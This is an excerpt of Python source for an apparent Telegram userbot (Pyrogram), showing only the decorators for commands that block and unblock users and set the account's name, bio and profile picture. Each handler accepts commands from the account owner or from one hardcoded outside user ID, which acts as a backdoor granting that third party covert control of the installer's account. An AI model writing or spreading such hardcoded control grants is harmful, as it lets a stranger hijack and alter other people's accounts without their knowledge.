...
@Client.on_message(
    filters.command(["unblock"], ".") & (filters.me | filters.user(7157276873))
)
...
@Client.on_message(filters.command(["بلوك"], ".") & (filters.me | filters.user(7157276873)))
...
@Client.on_message(
    filters.command(["setname"], ".") & (filters.me | filters.user(7157276873))
)
...
@Client.on_message(
    filters.command(["setbio"], ".") & (filters.me | filters.user(7157276873))
)
...
@Client.on_message(
    filters.command(["setpfp"], ".") & (filters.me | filters.user(7157276873))
)
...
@Client.on_message(
    filters.command(["vpfp"], ".") & (filters.me | filters.user(7157276873))
)
